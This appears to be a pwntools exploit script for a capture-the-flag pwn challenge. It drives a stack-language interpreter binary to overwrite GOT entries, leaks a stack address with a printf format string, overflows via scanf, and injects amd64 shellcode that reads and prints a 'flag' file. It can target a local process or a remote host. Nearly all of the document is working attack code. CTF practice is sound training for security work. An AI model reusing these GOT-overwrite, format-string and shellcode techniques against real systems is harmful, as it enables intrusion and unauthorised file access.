#!/usr/bin/python
from pwn import *
import sys
#sys.path.append('/home/lord_idiot/CTF-Tools/python-libs')

HOST = "35.200.23.198"
PORT = 31733

cmds = {
	"dup":"$",
	"pop":"%",
	"and":"&",
	"mul":"*",
	"add":"+",
	"write":",",
	"minus":"-",
	"writed":".",
	"div":"/",
	"store":":",
	"fetch":";",
	"eql":"=",
	"gt":">",
	"rot":"@",
	"swap":"\\",
	'neg':"_",
	'or':"|",
	'not':"~"
}
shellcode = ""

def cmd(s):
	global shellcode
	shellcode += cmds[s]
	return

def num(d):
	global shellcode
	shellcode += str(d)
	return

def n2h(n):
	if n < 0:
		return 0x100000000+n
	else:
		return n

def exploit(r):
	global shellcode

	# break stack
	num(0xffffffff)
	cmd("swap")

	# store PLT address of write
	for i in xrange(30):
		cmd("pop")
	num(0)
	cmd("store")
	num(1)
	cmd("store")
	
	# add write_PLT(0x796) by offset and store in 2(to form gadget)
	cmd("pop")
	cmd("pop")
	num(0x10C8-0x796) # main
	shellcode += "A"
	num(1)
	cmd("fetch")
	cmd("add")
	num(2)
	cmd("store")	

	# second gadget (printf)
	num(0x7d6-0x796)
	shellcode += "A"
	num(1)
	cmd("fetch")
	cmd("add")
	num(3)
	cmd("store")

	# third gadget (scanf)
	num(0x7E0-0x796)
	shellcode += "A"
	num(1)
	cmd("fetch")
	cmd("add")
	num(4)
	cmd("store")



	
	# overwrite :
	num(3)			# puts -> printf
	cmd("fetch")
	num(0)
	cmd("fetch")
	num(2)			# write -> main
	cmd("fetch")
	num(0)
	cmd("fetch")
	num(3)			# strlen -> printf
	cmd("fetch")
	num(0)
	cmd("fetch")

	cmd("write")

	r.recvline()
	r.sendline(shellcode)

	# leak using printf
	r.recvuntil("Once you get into the Abyss, you have no choice but keep going down.")
	r.sendline(",%8$p")
	stack_leak = int(r.recvuntil("Once", drop=True)[1:], 16)
	
	# overflow using scanf
	context.arch = 'amd64'
	actual_shellcode = asm(
		"""
			xor rsi, rsi
			xor rdx, rdx
			mov rdi, 0x{:x}
			xor rax, rax
			add rax, 2
			syscall
			mov rdi, rax
			mov rsi, 0x{:x}
			mov rdx, 0x50
			xor rax, rax
			syscall
			mov rdi, 0x1
			mov rsi, 0x{:x}
			mov rdx, 0x50
			mov rax, 0x1
			syscall
			mov rax, 0x3c
			syscall

		""".format(stack_leak-0x90+100, stack_leak, stack_leak)
	)																					
	shellcode = ""
	# overwrite:
	num(4)			# strlen -> scanf
	cmd("fetch")
	num(0)
	cmd("fetch")
	cmd("write")
	r.sendline(shellcode)
	r.sendline("%8$s")
	r.sendline("A"*8 + p64(stack_leak-0x90) + actual_shellcode.ljust(100, "\x90") + "flag\x00")

	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./user.elf"
	e = ELF(elf_name)
	
	libc_name = "./libc.so.6"
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name})
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
